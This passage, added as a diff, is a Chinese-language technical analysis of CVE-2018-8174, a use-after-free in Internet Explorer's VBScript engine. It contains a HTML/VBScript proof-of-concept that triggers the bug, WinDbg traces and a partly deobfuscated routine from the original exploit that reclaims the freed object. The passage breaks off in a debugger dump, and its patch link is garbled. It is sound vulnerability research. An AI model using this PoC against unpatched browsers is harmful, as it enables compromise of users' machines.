@@ -1,0 +1,2086 @@
+## 一、漏洞背景
+
+ **CVE-2018-8174漏洞是360追日安全团队于4份捕获到的，并将其命名为“双杀”漏洞，意指在IE浏览器以及office均可以引发的漏洞。**
+
+该漏洞在当时影响最新版本的IE浏览器以及使用了IE内核的应用程序。用户在浏览网页或者打开Office文档的时候都可能中招。
+
+微软在4月20号也确认了此漏洞，并在5月8号发布了官方补丁。本文档将对该漏洞进行详细分析理解，并提交复现过程与防御建议，供大家相互交流学习。
+
+> [微软针对gai'lou'dong补丁链接](https://www.freebuf.com/wp-admin/a%20href=)
+
+所影响版本：
+
+> Microsoft Excel 2010 SP2
+>
+> Microsoft Excel 2013 SP1
+>
+> Microsoft Excel 2016
+>
+> Microsoft Office 2010 SP2
+>
+> Microsoft Office 2013 RT SP1
+>
+> Microsoft Office 2013 SP1Microsoft Office 2016
+>
+> Microsoft Office Compatibility SP3...
+
+该漏洞影响比较广泛，可以在该链接查看详细列表： <https://www.securityfocus.com/bid/103998>  
+
+## 二、 漏洞原理
+
+### 2.1.UAF的理解
+
+首先了解一个简单的C++层面的悬垂指针：
+
+    
+    
+    #include "stdafx.h"
+    #include <malloc.h>int main()
+    {
+        char *p1;
+        p1 = (char*)malloc(sizeof(char) * 10);
+        memcpy(p1, "hello", 10);
+        printf("p1,addr:%x,%s\n", p1, p1);
+        free(p1);
+    
+        char *p2;
+        p2 = (char*)malloc(sizeof(char) * 10);
+        memcpy(p2, "hello", 10);
+        printf("p2,addr:%x,%s\n", p2, p1);
+        printf("p2,addr:%x,%s\n", p2, p2);
+        free(p2);
+        return 0;
+    }
+    
+    //输出：
+    //p1,addr:99ac88,hello
+    //p2,addr:99ac88,hello
+    //p2,addr:99ac88,hello  
+    
+
+在指针`p1`被释放后，却仍然可以执行已经被释放的内存，而且在 `free `了 `p1 `之后再次申请同样大小空间，操作系统会将刚刚 `free
+`了的内存重新分配。
+
+并且可以通过`p2`操作`p1`,那么如果再次使用`p1`，则可以通过`p2`修改程序功能等目的。`p1`就叫做
+悬垂指针，`UAF`会造成内存破坏的原因就是使用了悬垂指针。
+
+ **理解了上面的悬垂指针后再看在**`vbs中的悬垂指针` **是怎样的，** **根据原始`PoC `防写一个造成悬垂指针的脚本来理解一下：**
+
+    
+    
+    <html lang="en">
+    <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="IE=10">
+    </head>
+    <body>
+    <script language="vbscript">
+    Dim array_a
+    Dim array_b(1)
+    
+    
+    Class Trigger
+    '重载析构函数        
+    Private Sub Class_Terminate()        
+        
+        Alert "重载析构函数"
+        Set array_b(0)=array_a(1)            '增加了一个array_b(0)对Trigger实例的引用（Trigger实例引用计数+1）
+        
+        '删除array_a (1) 对Trigger实例的引用
+        'Trigger实例引用计数-1 来平衡引用计数
+        array_a(1)=1
+        IsEmpty(array_b)    'IsEmpty 方便断点观察
+    End Sub
+    End Class
+    
+    
+    Sub UAF 
+        Alert "UAF"
+        Alert "重新定义array_a"
+        ReDim array_a(1)                    
+        Alert "创建Trigger实例给数组array_a"
+        Set array_a(1)=New Trigger            
+        IsEmpty(array_a)
+        Alert "清空array_a中的元素，触发Class_Terminate"
+        Erase array_a                        
+        IsEmpty("Erase Finish")
+    End Sub
+    
+    Sub TriggerVuln
+        Alert "访问未分配的内存，触发漏洞 "
+        array_b(0)=0
+    End Sub
+    
+    
+    Sub StartExploit
+            UAF
+            TriggerVuln
+    End Sub
+    StartExploit
+    </script>
+    </body>
+    </html>  
+    
+
+如上：
+
+1，在UAF函数中，`Set array_a(1)=New Trigger` 是创建了一个 `Trigger 实例`给数组 `array_a`，
+`Erase array_a` 在析构 `array_a `中的元素时，会调用 `Trigger` 的重载的析构函数；
+
+2，在此函数中先增加了一个 `array_b(0) `对 `Trigger `实例的引用（`Trigger`实例引用计数+1），又通过
+`array_a(1)=1` 删除 ````array_a`(1) `对 `Trigger
+`实例的引用，（`Trigger的实例引用计数`减1）来平衡引用计数后，才会彻底释放 `Trigger 实例 `
+
+3，但是此时 `array_b(0) `仍然保留着这个类的引用，然后在 `TriggerVuln `函数中，`array_b(0)=0 ` 对`
+array_b(0) `进行访问时造成了触发漏洞，此时 `array_b(0) `就叫做悬垂指针
+
+ **2.1.1.调试** ****
+
+在`windbg `所在文件夹开启`hpa`页堆调试 和`ust`栈回溯选项:
+
+    
+    
+    //启用页面堆--开启hpa页堆调试 和ust堆分配记录
+    //关于此技术原理的可以看一下这个连接: http://www.cnblogs.com/Ox9A82/p/5603172.html
+    C:\TOOLS\windbg_cn\WinDbg(x86)>gflags.exe /i iexplore.exe +ust +hpa
+    
+    
+    //winDbg 附加IE调试后可以捕捉到此崩溃现场
+    //汇编
+    ..
+    76aa4966 8b4608          mov     eax,dword ptr [esi+8]
+    76aa4969 85c0            test    eax,eax
+    76aa496b 0f8454f5ffff    je      OLEAUT32!VariantClear+0xc3 (76aa3ec5)
+    76aa4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:06076fd0=????????
+    ..
+    
+    //command
+    0:013> g
+    (e84.548): Access violation - code c0000005 (first chance)                        //访问已经释放的内存，从而崩溃
+    First chance exceptions are reported before any exception handling.
+    This exception may be expected and handled.
+    eax=06076fd0 ebx=06192fe0 ecx=00000009 edx=00000002 esi=06192fe0 edi=00000009
+    eip=76aa4971 esp=0457d02c ebp=0457d034 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+    OLEAUT32!VariantClear+0xb3:
+    76aa4971 8b08            mov     ecx,dword ptr [eax]  ds:0023:06076fd0=????????
+    
+    0:005> !heap -p -a eax
+        address 06076fd0 found in
+        _DPH_HEAP_ROOT @ 17e1000
+        in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)     //对象所在的内存已经被释放
+                                        17e3e38:          6076000             2000
+        728390b2 verifier!AVrfDebugPageHeapFree+0x000000c2
+        774e65f4 ntdll!RtlDebugFreeHeap+0x0000002f
+        774aa0aa ntdll!RtlpFreeHeap+0x0000005d
+        774765a6 ntdll!RtlFreeHeap+0x00000142
+        76b898cd msvcrt!free+0x000000cd
+        7141406c vbscript!VBScriptClass::`scalar deleting destructor'+0x00000019    
+        7141411a vbscript!VBScriptClass::Release+0x00000043            //调用类的析构函数，释放了VBSClass对象，也就是脚本中的Trigger实例
+        76aa4977 OLEAUT32!VariantClear+0x000000b9
+        6bfce433 IEFRAME!Detour_VariantClear+0x0000002f
+        76abe325 OLEAUT32!ReleaseResources+0x000000a3
+        76abdfb3 OLEAUT32!_SafeArrayDestroyData+0x00000048
+        76ac5d2d OLEAUT32!SafeArrayDestroyData+0x0000000f
+        76ac5d13 OLEAUT32!Thunk_SafeArrayDestroyData+0x00000039
+        7145267f vbscript!VbsErase+0x00000057                        //call 了vbscript!VbsErase 此函数对应脚本中的`Erase array_a    `
+        71403854 vbscript!StaticEntryPoint::Call+0x00000011
+        7140586e vbscript!CScriptRuntime::RunNoEH+0x00001c10
+        71404ff6 vbscript!CScriptRuntime::Run+0x00000064  
+    
+
+ **在**`VBScriptClass::Release` **函数中的逻辑:**  
+
+    
+    
+    VBScriptClass *__stdcall VBScriptClass::Release(VBScriptClass *this)
+    {
+      VBScriptClass *this_1; // ebx@1
+      volatile LONG *v2; // edi@1
+      VBScriptClass *result_1; // [sp+14h] [bp+8h]@1
+    
+      this_1 = this;
+      v2 = (volatile LONG *)((char *)this + 4);
+      result_1 = (VBScriptClass *)InterlockedDecrement((volatile LONG *)this + 1);// 引用计数 -1，引用计数保存在&VBScriptClass+0x4的位置
+      if ( !result_1 )                                                            // result为引用计数，为零则进入内存释放
+      {
+        InterlockedIncrement(v2);
+        VBScriptClass::TerminateClass(this_1);                                    // 脚本重载了类Terminate的析构函数,在重载的函数中又增加了array_b对Object的引用
+        result_1 = (VBScriptClass *)InterlockedDecrement(v2);
+        if ( !result_1 )                                                          // 当认为当下的Object的引用计数已经为0时，进入系统析构程序
+        {
+          if ( this_1 )
+            (*(void (__thiscall **)(VBScriptClass *, signed int))(*(_DWORD *)this_1 + 0x68))(this_1, 1);// 调用析构函数释放VBScriptClass的内存
+        }
+      }
+      return result_1;
+    }  
+    
+
+ **2.1.2 溯源**  
+
+    
+    
+    // 在winDbg中这样下断点
+    bp vbscript!VBScriptClass::TerminateClass ".printf \"Class %mu at %x, terminate called\\n\", poi(@ecx + 0x24), @ecx; g";
+    bp vbscript!VBScriptClass::Release ".printf \"Class %mu at: %x ref counter, release called: %d\\n\", poi(@eax + 0x24), @ecx, poi(@eax + 0x4); g";
+    bp vbscript!VBScriptClass::Create+0x55 ".printf \"Class %mu created at %x\\n\", poi(@esi + 0x24), @esi; g";
+    bp vbscript!VbsIsEmpty  
+    
+
+ ** **第一次断点：**  
+**
+
+    
+    
+    //即可输出VBScriptClass对象名称，对象地址，虚函数表地址，以及引用计数：
+    0:013> g
+    Class Trigger created at 178afd0
+    Class Trigger at: 6fb61748 ref counter, release called: 2
+    Class Trigger at: 6fb61748 ref counter, release called: 2
+    Class Trigger at: 6fb61748 ref counter, release called: 2
+    
+    //类对象地址
+    0:005> ln poi (0178afd0 )
+    (6fb61748)   vbscript!VBScriptClass::`vftable'   |  (6fb6c518)   vbscript!__pfnDefaultDliNotifyHook2
+    Exact matches:
+        vbscript!VBScriptClass::`vftable' = <no type information>
+    
+    
+    0:005> dd 0178afd0 
+    0178afd0  6fb61748 00000002 05fd1f78 08477f88    //02是引用计数的值
+    0178afe0  00000e08 00000000 00000000 05fd5efc
+    0178aff0  00000000 088d6fe4 00000000 00000000
+    
+    0:005> du 088d6fe4         //类的名字
+    088d6fe4  "Trigger"
+    
+    //也可以通过vbscript!VbsIsEmpty断点追溯到类的地址。如下：
+    Breakpoint 3 hit
+    eax=6fb6185c ebx=044bd284 ecx=6fbba9d8 edx=044bd1fc esi=05faf54c edi=00000001
+    eip=6fb7c206 esp=044bd118 ebp=044bd128 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6fb7c206 8bff            mov     edi,edi
+    
+    0:005> dd poi(esp+c) 
+    05fbbf60  044b004a 77431fd0 0174bfe8 01721020          //0174bfe8是数据结构地址
+    05fbbf70  c0c00000 c0c0c0c0 c0c0c0c0 c0c0c0c0
+    05fbbf80  044bd578 05fbbfa0 c0c0c0c0 c0c0c0c0
+    05fbbf90  c0c00000 c0c0c0c0 c0c0c0c0 c0c0c0c0
+    05fbbfa0  044bd7bc 05fbbfe0 c0c00001 c0c0c0c0
+    05fbbfb0  0000400c 00000000 05fc5ec8 00000000
+    05fbbfc0  0000400c 00000000 05fc5e88 00000000
+    05fbbfd0  c0c00000 c0c0c0c0 c0c0c0c0 c0c0c0c0
+    
+    0:005> dd 0174bfe8  l8
+    0174bfe8  044b200c 77431fd0 0833efe8 01721020//200c这两个字节表示的是VBScript变量类型，表示的是SAFEARRAY类型，ARRAY在07f4dfe8存放
+    0174bff8  00000000 c0c0c0c0 ???????? ????????
+    
+       
+    0:005> dt ole32!safearray 0833efe8         //解析safearray结构，pvdata表示数据地址
+       +0x000 cDims            : 1             //cDims表示维数
+       +0x002 fFeatures        : 0x880
+       +0x004 cbElements       : 0x10
+       +0x008 cLocks           : 0
+       +0x00c pvData           : 0x08346fe0 Void        //array_a数据元素地址
+       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
+       
+    0:005> dd 0x08346fe0
+    08346fe0  00000000 00000000 00000000 00000000        //array_a(0)没有定义
+    08346ff0  c0c00009 c0c0c0c0 0178afd0 c0c0c0c0        //array_a(1)type==0x9表示是一个object,值为0178afd0
+    08347000  ???????? ???????? ???????? ????????
+    
+    //即找到类对象的地址，也就是说array_a(1)已经指向了Trigger对象
+    0:005> dd 0178afd0 
+    0178afd0  6fb61748 00000002 05fd1f78 08477f88
+    0178afe0  00000e08 00000000 00000000 05fd5efc
+    0178aff0  00000000 088d6fe4 00000000 00000000
+    0178b000  ???????? ???????? ???????? ????????
+    
+    0:005> du 088d6fe4 
+    088d6fe4  "Trigger"  
+    
+
+ **第二次断点：** ****
+
+执行到第二个 `ISEmpty `,即析构函数中的`ISEmpty`的时候（在`Erase
+array_a`的时候，会触发`Class_Terminate`析构函数），此时`Set array_b(0)=array_a(1)`已执行;则：
+
+    
+    
+    Breakpoint 3 hit
+    eax=6fb6185c ebx=044bcf48 ecx=6fbba9d8 edx=044bcec0 esi=05faf54c edi=00000001
+    eip=6fb7c206 esp=044bcddc ebp=044bcdec iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6fb7c206 8bff            mov     edi,edi
+    
+    0:005> dd poi(esp+c) 
+    05fbbf30  c0c0600c c0c0c0c0 05fc5ed4 082a4fe8        //data buffer 在082a4fe8
+    05fbbf40  c0c00000 c0c0c0c0 0178afd0 c0c0c0c0
+    05fbbf50  044bd334 05fbbf80 c0c00001 c0c0c0c0
+    05fbbf60  044b400c 77431fd0 05fc5e88 01721020
+    05fbbf70  c0c00000 c0c0c0c0 c0c0c0c0 c0c0c0c0
+    05fbbf80  044bd578 05fbbfa0 c0c0c0c0 c0c0c0c0
+    05fbbf90  c0c00000 c0c0c0c0 c0c0c0c0 c0c0c0c0
+    05fbbfa0  044bd7bc 05fbbfe0 c0c00001 c0c0c0c0
+    
+    0:005> dd 082a4fe8                                    //safearray结构
+    082a4fe8  08920001 00000010 00000000 012edfe0        
+    082a4ff8  00000002 00000000 ???????? ????????
+    082a5008  ???????? ???????? ???????? ????????
+    
+    0:005> dt ole32!safearray 082a4fe8
+       +0x000 cDims            : 1
+       +0x002 fFeatures        : 0x892
+       +0x004 cbElements       : 0x10
+       +0x008 cLocks           : 0
+       +0x00c pvData           : 0x012edfe0 Void        //array_b数据元素地址
+       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
+       
+    0:005> dd 0x012edfe0 lc
+    012edfe0  c0c00009 c0c0c0c0 0178afd0 c0c0c0c0        //类型还是0x09，array_b(0)中此时保存着类对象地址
+    012edff0  00000000 00000000 00000000 00000000
+    012ee000  ???????? ???????? ???????? ????????
+    
+    0:005> ln poi(0178afd0 )        //类对象地址 0178afd0
+    (6fb61748)   vbscript!VBScriptClass::`vftable'   |  (6fb6c518)   vbscript!__pfnDefaultDliNotifyHook2
+    Exact matches:
+        vbscript!VBScriptClass::`vftable' = <no type information>
+        
+    0:005> dd 0178afd0 
+    0178afd0  6fb61748 00000004 05fd1f78 08477f88
+    0178afe0  00000e08 00000000 00000000 05fd5efc
+    0178aff0  00000001 088d6fe4 00000000 00000000
+    0178b000  ???????? ???????? ???????? ????????
+    
+    0:005> du 088d6fe4             //类名称
+    088d6fe4  "Trigger"  
+    
+
+ **第三次断点：** **此时**`Erase` **已经执行完毕：**  
+
+    
+    
+    Breakpoint 3 hit
+    eax=6fb6185c ebx=044bd284 ecx=6fbba9d8 edx=044bd1fc esi=05faf54c edi=00000001
+    eip=6fb7c206 esp=044bd118 ebp=044bd128 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6fb7c206 8bff            mov     edi,edi
+    
+    //此时查看object的地址为空，
+    0:005> dd 0178afd0
+    0178afd0  ???????? ???????? ???????? ????????
+    0178afe0  ???????? ???????? ???????? ????????
+    0178aff0  ???????? ???????? ???????? ????????
+    
+    
+    0:005> !heap -p -a 0178afd0
+        address 0178afd0 found in
+        _DPH_HEAP_ROOT @ 1721000
+        //in free-ed allocation 表示已经被释放
+        in free-ed allocation (  DPH_HEAP_BLOCK:         VirtAddr         VirtSize)
+                                        1722e38:          178a000             2000
+        733390b2 verifier!AVrfDebugPageHeapFree+0x000000c2
+        774e65f4 ntdll!RtlDebugFreeHeap+0x0000002f
+        774aa0aa ntdll!RtlpFreeHeap+0x0000005d
+        774765a6 ntdll!RtlFreeHeap+0x00000142
+        ..
+        ..
+    
+    //此时分别查看array_b与array_a 的情况：
+    
+    //array_b(0)的情况：
+    0:005> dd 0x012edfe0
+    012edfe0  c0c00009 c0c0c0c0 0178afd0 c0c0c0c0            //array_b(0)依然保存着类对象地址，但是类对象已经被释放了
+    012edff0  00000000 00000000 00000000 00000000
+    012ee000  ???????? ???????? ???????? ????????
+    012ee010  ???????? ???????? ???????? ????????
+    
+    //array_a的情况：
+    0:005> dd 0x08346fe0
+    08346fe0  ???????? ???????? ???????? ????????             //array_a已经被释放
+    08346ff0  ???????? ???????? ???????? ????????
+    08347000  ???????? ???????? ???????? ????????  
+    
+
+ ** **显然有些地方出现了错误，明明`array_b `还保留着对` Trigger Object`引用的时候，`Trigger Object`却随着
+`Erase array_a`被释放了。我们来看看错误的地方：**  
+**
+
+### 2.2 验证
+
+在IDA里面查看过 `VBScriptClass::Release` 的伪代码，以及上面的调试后，我们猜测在脚本中的重载的析构函数中，`Set
+array_b(0)=array_a(1)`这句是否有对` Class Trigger `的引用计数进行操作，
+
+**![image.png](https://image.3001.net/images/20200102/1577944368_5e0d853062e90.png!small)**
+
+接下来进行验证，在以下位置下断点：  
+
+    
+    
+    bu  vbscript!VbsErase
+    bu  vbscript!VBScriptClass::Release
+    bu  vbscript!VbsIsEmpty
+    bp  vbscript!VBScriptClass::Create+0x55 ".printf \"Class %mu created at %x\\n\", poi(@esi + 0x24), @esi; g";  
+    
+
+前面的几次 Release 不用看，一直到`VbsErase`后面的`release`的时候单步调试  
+
+（此时在调试日志中，类对象地址已经被`bp vbscript!VBScriptClass::Create+0x55 ".printf \"Class %mu
+created at %x\\n\", poi(@esi + 0x24), @esi; g"`; 打印出来了，或者运行到 release 的时候的`esp
++8`也是类对象地址）  
+
+    
+    
+    0:005> g
+    Class Trigger created at 189bfd0
+    ..
+    ..
+    Breakpoint 1 hit
+    eax=0189bfd0 ebx=00000020 ecx=6d9a1748 edx=00000000 esi=087efff0 edi=00000009
+    eip=6d9b1ef3 esp=0468c9cc ebp=0468c9dc iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    vbscript!VBScriptClass::Release:
+    6d9b1ef3 8bff            mov     edi,edi
+    
+    0:005> dd 189bfd0
+    0189bfd0  6d9a1748 00000001 06103f78 08657f88    //此时的引用计数为1
+    0189bfe0  00000d80 00000000 00000000 06107efc
+    0189bff0  00000000 071e4fe4 00000000 00000000
+    0189c000  ???????? ???????? ???????? ????????
+    
+    单步调试到：
+    6d9b1efc 56              push    esi
+    6d9b1efd 8b35e4129a6d    mov     esi,dword ptr [vbscript!_imp__InterlockedDecrement (6d9a12e4)]
+    6d9b1f03 57              push    edi
+    6d9b1f04 8d7b04          lea     edi,[ebx+4]
+    6d9b1f07 57              push    edi                            //edi 中保存的便是object的引用计数
+    6d9b1f08 ffd6            call    esi {kernel32!InterlockedDecrementStub (775bbbf0)}
+    6d9b1f0a 894508          mov     dword ptr [ebp+8],eax
+    6d9b1f0d 85c0            test    eax,eax                        //如果此时的引用计数为0，
+    6d9b1f0f 0f84d8210000    je      vbscript!VBScriptClass::Release+0x1e (6d9b40ed)//则进入Release+0x1e，调用析构函数
+    6d9b1f15 8b4508          mov     eax,dword ptr [ebp+8]
+    
+    //此时的edi 的值为1，然后调用InterlockedDecrementStub 把引用计数减一
+    0:005> dd edi
+    0189bfd4  00000001 06103f78 08657f88 00000d80
+    
+    //继续调试，这里就执行 我们代码中 的Set array_b(0)=array_a(1)这句了
+    6da140f4 8bcb            mov     ecx,ebx
+    6da140f6 e829000000      call    vbscript!VBScriptClass::TerminateClass (6da14124)
+    6da140fb 57              push    edi
+    6da140fc ffd6            call    esi
+    6da140fe 894508          mov     dword ptr [ebp+8],eax
+    6da14101 85c0            test    eax,eax
+    6da14103 0f850cdeffff    jne     vbscript!VBScriptClass::Release+0x43 (6da11f15)
+    6da14109 85db            test    ebx,ebx
+    6da1410b 0f8404deffff    je      vbscript!VBScriptClass::Release+0x43 (6da11f15)
+    6da14111 8b03            mov     eax,dword ptr [ebx]
+    6da14113 6a01            push    1
+    6da14115 8bcb            mov     ecx,ebx
+    6da14117 ff5068          call    dword ptr [eax+68h]  ds:0023:6da017b0={vbscript!VBScriptClass::`vector deleting destructor' (6da14053)}            //最终因为引用计数为0，调用vector deleting destructo，释放对象内存
+    
+    
+    0:005> p
+    eax=00000001 ebx=01882fd0 ecx=01882fd0 edx=00000000 esi=775bbbf0 edi=01882fd4
+    eip=6da140f6 esp=045ccd8c ebp=045ccd98 iopl=0         nv up ei pl nz na po nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+    vbscript!VBScriptClass::Release+0x27:
+    6da140f6 e829000000      call    vbscript!VBScriptClass::TerminateClass (6da14124)
+    0:005> dd 1882fd0
+    01882fd0  6da01748 00000001 05f31f78 08469f88        //在进入TerminateClass前引用计数为1
+    01882fe0  0000098c 00000000 00000000 05f35efc
+    01882ff0  00000000 087e4fe4 00000000 00000000
+    01883000  ???????? ???????? ???????? ????????
+    
+    0:005> p
+    eax=00000000 ebx=01882fd0 ecx=01882fd4 edx=0008001f esi=775bbbf0 edi=01882fd4
+    eip=6da140fb esp=045ccd8c ebp=045ccd98 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VBScriptClass::Release+0x2c:
+    6da140fb 57              push    edi
+    0:005> dd 1882fd0
+    01882fd0  6da01748 00000001 05f31f78 08469f88        //在执行TerminateClass后引用计数仍然为1，
+    01882fe0  0000098c 00000000 00000000 05f35efc
+    01882ff0  00000001 087e4fe4 00000000 00000000
+    01883000  ???????? ???????? ???????? ????????
+    
+    //所以问题就在这里，它没有因为Set array_b(0)=array_a(1)，而增加类对象的引用计数，造成了在类对象被释放后array_b(0)仍然指向那个类对象地址，而造成了悬垂指针  
+    
+
+ **漏洞原因总结：**
+
+此漏洞就是存在于`release
+函数`中，如果在自定义的脚本中重载了析构函数，在这个函数中操作了类的引用计数（UAF），而release函数不能正确的判断类的引用计数造成而去析构了这个类，但是仍然指向这个类的指针就变成了`悬垂指针,`后面通过这个悬垂指针进行一些操作来达到任意读写的目的。
+
+接下来我们调试原始`PoC`看它是怎么对这个悬垂指针进行利用的,需要对`vbs`的基本的 [数据结构
+](https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/scripting-articles/3kfz157h\(v%3Dvs.84\))有所了解：
+
+`0x200C，即VT_VARIANT|VT_ARRAY`
+
+Constant | Value | Description  
+---|---|---  
+vbEmpty | 0 | Empty (uninitialized)  
+vbNull | 1 | Null (no valid data)  
+vbInteger | 2 | Integer  
+vbLong | 3 | Long integer  
+vbSingle | 4 | Single-precision floating-point number  
+vbDouble | 5 | Double-precision floating-point number  
+vbCurrency | 6 | Currency  
+vbDate | 7 | Date  
+vbString | 8 | String  
+vbObject | 9 | Automation object  
+vbError | 10 | Error  
+vbBoolean | 11 | Boolean  
+vbVariant | 12 | Variant (used only with arrays of Variants)  
+vbDataObject | 13 | A data-access object  
+vbByte | 17 | Byte  
+vbArray | 8192 | Array  
+  
+## ****三、 原PoC剥茧抽丝 ****
+
+理解了上面的基础之后我们开始调试原始`PoC`
+
+原始`PoC `在变量名和数据计算中存在大量的混淆，对重要位置进行还原： （以及加入了一些`IsEmpty`后方便查看参数）
+
+###  **3.1 PoC中的UAF**
+
+ **先分析一下原始poc中的UAF函数：**
+
+    
+    
+    Sub UAF
+     Alert "UAF"
+        For i=0 To 19
+            Set array(i)=New Foo   '占据系统堆碎片
+        Next
+        For i=20 To 39
+            Set array(i)=New MyClass2  '占据系统堆碎片
+        Next
+    '--------------------------------------------------------------------------        For i=0 To 6
+            ReDim array_a(1) 
+            Set array_a(1)=New Trigger  
+            Erase array_a      'array_b保存了对已经释放的Trigger obj的引用
+        Next
+        IsEmpty(array_b)      
+        Set MyClass2_obj1=New MyClass2   '同时MyClass2_obj2对它占位
+        IsEmpty(MyClass2_obj1)
+    '--------------------------------------------------------------------------        spec_int_2=0
+        For i=0 To 6
+            ReDim array_a(1)
+            Set array_a(1)=New cla2    'array_c保存了对已经释放的 cla2 obj 的引用
+            Erase array_a        
+        Next
+        IsEmpty(array_c)
+        Set MyClass2_obj2=New MyClass2   '同时MyClass2_obj2对它占位
+        IsEmpty(MyClass2_obj2)
+    End Sub  
+    
+    
+    
+    //断点：
+    0:005> bl
+     0 e 710b4124     0001 (0001)  0:**** vbscript!VBScriptClass::TerminateClass ".printf \"Class %mu at %x, terminate called\\n\", poi(@ecx + 0x24), @ecx; g"
+     2 e 710b463d     0001 (0001)  0:**** vbscript!VBScriptClass::Create+0x63 ".printf \"Class %mu created at %x\\n\", poi(@esi + 0x24), @esi; g"
+     3 e 710bc206     0001 (0001)  0:**** vbscript!VbsIsEmpty  
+    
+
+ ** **第一次`IsEmpty`断点，参数为`array_b`：**  
+**
+
+    
+    
+    //参数传入的array_b，进入函数后栈空间可以查看
+    Breakpoint 3 hit
+    eax=6ab1185c ebx=0289cb64 ecx=6ab6a9d8 edx=0289cadc esi=0104783c edi=00000001
+    eip=6ab2c206 esp=0289c9f8 ebp=0289ca08 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6ab2c206 8bff            mov     edi,edi
+    
+    0:006> dd poi(esp+C)
+    0049f1a0  0000600c 00000000 01051100 0034c4c8  //0034c4c8 是array_b 的data buffer    
+    0049f1b0  02890002 0049ffc0 01050013 0289c9c0
+    0049f1c0  02890002 0049ffc0 01050001 0289c9c0
+    0049f1d0  6ab10002 0289c9fc 02890027 0049ffc0
+    0049f1e0  6ab10002 0289c9fc 02890001 0049ffc0
+    0049f1f0  6ab10002 0289c9fc 02890006 0049ffc0
+    0049f200  6ab10002 0289c9fc 02890001 0049ffc0
+    0049f210  00000000 00000000 00000000 00000000
+    
+    0:006> dt ole32!safearray 0034c4c8
+       +0x000 cDims            : 1
+       +0x002 fFeatures        : 0x892
+       +0x004 cbElements       : 0x10
+       +0x008 cLocks           : 0
+       +0x00c pvData           : 0x00371a68 Void   //array_b数据元素地址
+       +0x010 rgsabound        : [1] tagSAFEARRAYBOUND
+       
+    0:006> dd 00371a68
+    00371a68  01030009 00000000 010526e0 00000000     //010526e0类对象地址
+    00371a78  6ab10009 010526e4 010526e0 6ab14211
+    00371a88  6ab10009 010526e4 010526e0 6ab14211
+    00371a98  6ab10009 010526e4 010526e0 6ab14211
+    00371aa8  6ab10009 010526e4 010526e0 6ab14211
+    00371ab8  6ab10009 010526e4 010526e0 6ab14211
+    00371ac8  6ab10009 010526e4 010526e0 6ab14211
+    00371ad8  5e2b1c44 88000000 0030007b 0030002e
+    
+    0:006> dd 010526e0 
+    010526e0  6ab100c6 00000000 00000000 00000000   //引用计数已经为0
+    010526f0  00000808 00000000 00000000 0103799c
+    01052700  00000001 003af554 00000000 00000000
+    01052710  5e163a1d 80000000 000000cd 00000000
+    
+    0:006> du 003af554 
+    003af554  "Trigger"
+
+ ** **第二次`IsEmpty`断点，此时 `cla4_obj1 `占位已经完成：**  
+**
+
+    
+    
+    //仍然查看10526e0类对象地址
+    Class cla4 created at 10526e0
+    
+    Breakpoint 3 hit
+    eax=6ab1185c ebx=0289cb64 ecx=6ab6a9d8 edx=0289cadc esi=0104783c edi=00000001
+    eip=6ab2c206 esp=0289c9f8 ebp=0289ca08 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6ab2c206 8bff            mov     edi,edi
+    
+    0:006> dd 010526e0 
+    010526e0  6ab11748 00000002 010345e0 0049e910  //引用计数变为0x02
+    010526f0  00000808 00000000 00000000 00000000
+    01052700  00000000 003af554 00000000 010526a8
+    01052710  5e163a1d 80000000 000000cd 00000000
+    01052720  00000000 00000000 00000000 00000000
+    01052730  00000000 00000000 00000000 00000000
+    01052740  00000000 00000000 5e163a16 80000000
+    01052750  000000d4 00000000 00000000 00000000
+    0:006> du 003af554 
+    003af554  "cla4"         //同样的地址cla4_obj1已经占位  
+    
+
+ ** ** **第三次`IsEmpty`断点，参数为`array_c`：**  
+** **
+
+    
+    
+    Breakpoint 3 hit
+    eax=6ab1185c ebx=0289cb64 ecx=6ab6a9d8 edx=0289cadc esi=0104783c edi=00000001
+    eip=6ab2c206 esp=0289c9f8 ebp=0289ca08 iopl=0         nv up ei pl zr na pe nc
+    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+    vbscript!VbsIsEmpty:
+    6ab2c206 8bff            mov     edi,edi
+    
+    
+    0:006> dd poi(esp+C)
+    0049f1a0  0000600c 00000000 01051140 00375bc0  //00340308是array_c的data buffer
+    0049f1b0  02890002 0049ffc0 01050013 0289c9c0
+    0049f1c0  02890002 0049ffc0 01050001 0289c9c0
+    0049f1d0  6ab10002 0289c9fc 02890027 0049ffc0
+    0049f1e0  6ab10002 0289c9fc 02890001 0049ffc0
+    0049f1f0  6ab10002 0289c9fc 02890006 0049ffc0
+    0049f200  6ab10002 0289c9fc 02890001 0049ffc0
+    0049f210  6ab10002 0289c9fc 02890006 0049ffc0
+    
+    
+    0:006>  dt ole32!safearray 00375bc0
+       +0x000 cDims            : 1
+       +0x002 fFeatures        : 0x892
+       +0x004 cbElements       : 0x10
+       +0x008 cLocks           : 0
